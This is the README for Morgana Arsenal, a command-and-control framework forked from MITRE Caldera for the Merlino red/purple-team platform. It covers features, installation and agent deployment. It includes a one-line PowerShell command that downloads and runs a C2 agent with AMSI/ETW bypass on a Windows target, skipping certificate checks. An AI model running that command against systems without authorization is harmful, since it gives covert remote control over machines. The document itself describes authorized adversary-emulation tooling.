# Morgana Arsenal

**Morgana Arsenal** is a Command & Control (C2) framework derived from [MITRE Caldera v5.3.0](https://github.com/mitre/caldera). It is a fork specifically modified and extended to work natively with **Merlino**, an advanced platform for red teaming, purple teaming, and cyber threat intelligence (CTI) operations.

> This repository is a fork of MITRE Caldera. If you are looking for the original project, visit [github.com/mitre/caldera](https://github.com/mitre/caldera). Morgana Arsenal is not affiliated with or endorsed by MITRE.

---

## What is Merlino?

**[Merlino](https://merlino.x3m.ai)** is an advanced threat emulation and cyber threat intelligence (CTI) platform designed for security operations centers (SOC), red teams, blue teams, and detection engineers. It covers the full spectrum of offensive and defensive security operations:

- **Purple teaming** - coordinate joint red/blue exercises, track detection coverage in real time, and validate controls against specific threat actor TTPs
- **Advanced CTI** - ingest, correlate, and operationalize threat intelligence to drive emulation plans based on real-world adversary behavior, and also native MISP integration for sharing and consuming structured threat data
- **Red teaming** - plan and execute adversary emulation campaigns mapped to MITRE ATT&CK techniques
- **Blue teaming** - support defensive analysts with structured attack data, detection gap analysis, and response validation

Merlino provides a familiar interface (including a Microsoft Excel Add-in) so analysts can work without leaving their existing toolchain. It communicates with Morgana Arsenal as its backend C2 engine: it sends operation plans, receives execution results, and tracks link-level output from deployed agents - all without requiring analysts to interact directly with the C2 console.

Website: [https://merlino.x3m.ai](https://merlino.x3m.ai)

---

## What is Morgana Arsenal?

Morgana Arsenal is the server-side component of the Merlino ecosystem. It extends MITRE Caldera with:

- **Merlino Agent** - a lightweight C# agent (16KB) for Windows with AMSI/ETW bypass, compiled for stealth and low footprint
- **Merlino Sync API** - a dedicated REST API (`/merlino/synchronize`) that allows Merlino to push and pull operation data in real time
- **Enhanced UI** (Magma plugin) - improved operations view with auto-refresh, searchable tables, TCodes column, and colored action buttons
- **HTTPS-first deployment** - unified agent communication over port 443 with self-signed certificate support
- **MISP integration** - optional threat intelligence integration via MISP
- **One-line installation** - automated installer for Ubuntu that sets up Morgana Arsenal, Nginx, SSL, and MISP in a single command

---

## Installation

### Fresh installation (Ubuntu - recommended)

Installs Morgana Arsenal + MISP + Nginx + SSL from scratch:

```bash
curl -sL https://raw.githubusercontent.com/x3m-ai/morgana-arsenal/main/install-update/install-morgana-misp.sh | sudo bash
```

The installer runs fully automated and covers the following steps:

1. **System dependencies** - installs Python 3, pip, Node.js, Mono (for Merlino agent compilation), PHP, MariaDB, Redis, and all required packages
2. **Morgana Arsenal** - clones the repository, creates a Python virtual environment, installs pip requirements, builds the Vue frontend (Magma), and compiles the Merlino C# agent (`Merlino.exe`) with `mcs`
3. **Local DNS** - configures `dnsmasq` with local domains (`morgana.merlino.local`, `misp.merlino.local`, `launcher.merlino.local`)
4. **SSL certificates** - generates a self-signed certificate (10-year validity) for HTTPS on port 443
5. **Nginx** - configures reverse proxy with four virtual hosts: launcher (port 80), Morgana (port 443), MISP HTTP (port 8080), MISP HTTPS (port 8443); adds CORS headers for the Merlino Excel Add-in
6. **Morgana systemd service** - creates and enables `morgana-arsenal.service` for automatic startup
7. **MISP** - clones MISP, installs Composer dependencies, sets up PHP-FPM
8. **MariaDB** - creates the MISP database and user
9. **MISP configuration** - configures MISP for local use and integration with Morgana
10. **MISP Modules** - installs `misp-modules` for enrichment and CTI processing
11. **Nginx for MISP** - adds MISP-specific Nginx blocks
12. **Service startup** - starts and enables all services (Morgana, MISP, MISP Modules, Nginx)
13. **Verification** - checks that all services are running and prints a summary with URLs and credentials

If Morgana Arsenal is already installed, the script detects it automatically and runs in **update mode**: pulls the latest code, updates plugins in `local.yml`, rebuilds the frontend, and restarts the service - without touching existing data, SSL certificates, or MISP.

The full installation log is saved to `morgana-install.log` in the same directory where the script runs.

### Update only (existing installation)

Updates Morgana Arsenal code without touching Nginx, SSL, or MISP:

```bash
curl -sL https://raw.githubusercontent.com/x3m-ai/morgana-arsenal/main/install-update/update-morgana.sh | sudo bash
```

### Manual start

```bash
cd /path/to/morgana-arsenal
python3 server.py --insecure --log DEBUG
```

---

## Requirements

- Linux (Ubuntu 22.04+ recommended)
- Python 3.10+
- Node.js v16+ (for UI build)
- 4GB+ RAM, 2+ CPUs

---

## Agent Deployment (Merlino Agent)

One-line deployment on a Windows target:

```powershell
$s="<YOUR_SERVER_IP>";curl.exe -k -H "file: Merlino.exe" "https://$s/file/download" -o Merlino.exe;.\Merlino.exe -server "https://$s"
```

---

## License

This project is licensed under the Apache License 2.0. It is a derivative work of MITRE Caldera.
See the [NOTICE](NOTICE) file for full attribution and modification details.

## Base Project

- **MITRE Caldera**: [https://github.com/mitre/caldera](https://github.com/mitre/caldera)
- **ATT&CK Framework**: [https://attack.mitre.org](https://attack.mitre.org)
- **Merlino**: [https://merlino.x3m.ai](https://merlino.x3m.ai)
